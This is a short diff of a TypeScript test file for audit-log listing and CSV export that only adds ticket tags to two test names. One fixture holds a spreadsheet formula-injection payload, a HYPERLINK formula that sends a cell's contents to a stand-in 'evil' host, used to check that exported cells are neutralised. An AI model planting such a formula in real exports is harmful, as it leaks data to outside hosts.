@@ -98,7 +98,7 @@ function limitOf(statements: Statement[]): unknown {
   return query?.values.at(-1);
 }
 
-describe('listAuditLogs — page size', () => {
+describe('listAuditLogs — page size [AUDIT-R4]', () => {
   it.each([
     [-5, 2],
     [0, 2],
@@ -153,7 +153,7 @@ describe('buildAuditExport — CSV', () => {
     ...overrides,
   });
 
-  it('neutralises formula prefixes in member-authored cells', async () => {
+  it('neutralises formula prefixes in member-authored cells [AUDIT-R6]', async () => {
     const fake = fakeSql([
       row({
         resourceName: '=HYPERLINK("http://evil/"&A1,"x")',
